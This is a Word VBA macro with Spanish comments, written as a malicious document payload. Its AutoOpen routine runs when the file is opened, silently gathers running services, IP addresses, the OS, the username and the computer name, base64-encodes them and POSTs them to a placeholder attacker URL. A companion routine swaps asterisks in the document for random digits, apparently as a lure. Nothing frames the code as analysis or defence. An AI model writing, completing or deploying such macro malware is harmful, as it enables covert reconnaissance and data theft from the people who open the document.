Sub AutoOpen()
    Dim systemInfo As String
    Dim base64SystemInfo As String
    Dim url As String
        
    base64SystemInfo = EncodeBase64(ObtenerListaDeServicios & ObtenerIPs & GetOSInfo)
    Call ReemplazarAsteriscosPorNumeros
    ' Construir la URL
    ' Enviar peticion GET (codigo necesario aqui)
    Call SendRequest("&YOURSUPERURLHERE&", "POST", "req=" & base64SystemInfo)
End Sub

Function ObtenerIPs() As String
    Dim objWMIService As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim ipInfo As String
    
    ' Conectar con el servicio WMI
    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
    
    ' Obtener la coleccion de objetos de configuracion de IP
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True", , 48)
    
    ' Iterar a traves de las configuraciones de IP y obtener informacion
    For Each objItem In colItems
        If Not IsNull(objItem.Description) Then
            ipInfo = ipInfo & "Descripcion: " & objItem.Description & vbCrLf
        End If
        
        If Not IsNull(objItem.Description) Then
            Dim IPs() As Variant
            IPs = objItem.IPAddress
            If Not IsEmpty(IPs) Then
                For Each IP In IPs
                    ipInfo = ipInfo & "Direccion IP: " & IP & vbCrLf
                Next
            End If
        End If
        
        ipInfo = ipInfo & "-----------------------------------" & vbCrLf
    Next
    
    ' Liberar recursos
    Set colItems = Nothing
    Set objWMIService = Nothing
    
    ' Retorna la informacion de las IPs
    ObtenerIPs = ipInfo
End Function

Function ObtenerListaDeServicios() As String
    Dim objWMIService As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim serviceInfo As String
    
    ' Conectar con el servicio WMI
    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
    
    ' Obtener la coleccion de objetos de servicios
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Service", , 48)
    
    ' Iterar a traves de los servicios y obtener informacion
    For Each objItem In colItems
        serviceInfo = serviceInfo & "Nombre: " & objItem.Name & vbCrLf & "Estado: " & objItem.State & vbCrLf & "-----------------------------------"
    Next
    
    ' Liberar recursos
    Set colItems = Nothing
    Set objWMIService = Nothing
    ObtenerListaDeServicios = serviceInfo
End Function


Function GetOSInfo() As String
    
    GetOSInfo = "Sistema operativo: " & Environ("OS") & vbCrLf & _
                 "Nombre de usuario: " & Environ("Username") & vbCrLf & _
                 "Nombre de la computadora: " & Environ("ComputerName")
End Function


Function EncodeBase64(ByVal text As String) As String
    Dim arrData() As Byte
    arrData = StrConv(text, vbFromUnicode)
    
    Dim objXML As Object
    Set objXML = CreateObject("MSXML2.DOMDocument")
    
    Dim objNode As Object
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.nodeTypedValue = arrData
    EncodeBase64 = objNode.text
    
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Sub SendRequest(ByVal url As String, ByVal method As String, Optional ByVal postData As String)
    Dim xmlHttp As Object
    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

    xmlHttp.SetOption 2, xmlHttp.GetOption(2)
    xmlHttp.SetOption(3) = False
    
    xmlHttp.Open method, url, False
    
    If method = "POST" Then
        xmlHttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        xmlHttp.send postData
    Else
        xmlHttp.send
    End If
    
    'MsgBox xmlHttp.responseText
    
    Set xmlHttp = Nothing
End Sub

Sub ReemplazarAsteriscosPorNumeros()
    Dim doc As Document
    Dim rng As Range
    Dim i As Integer
    Dim asteriscos As String
    Dim nuevoNumero As Integer
    Dim numerosUsados As String
    
    Set doc = ActiveDocument
    Set rng = doc.Content
    asteriscos = "*"
    numerosUsados = ""
    
    ' Realizar el reemplazo
    For Each c In rng.Characters
        If c.text = asteriscos Then
            Do
                ' Generar un número aleatorio entre 0 y 9
                nuevoNumero = Int((9 - 0 + 1) * Rnd + 0)
            Loop While InStr(numerosUsados, CStr(nuevoNumero)) > 0
            
            ' Reemplazar el asterisco por el número aleatorio
            c.text = CStr(nuevoNumero)
            
            ' Agregar el número aleatorio a la lista de números usados
            numerosUsados = numerosUsados & CStr(nuevoNumero)
        End If
    Next c
    'MsgBox "Los asteriscos (*) han sido reemplazados por números aleatorios únicos."
End Sub
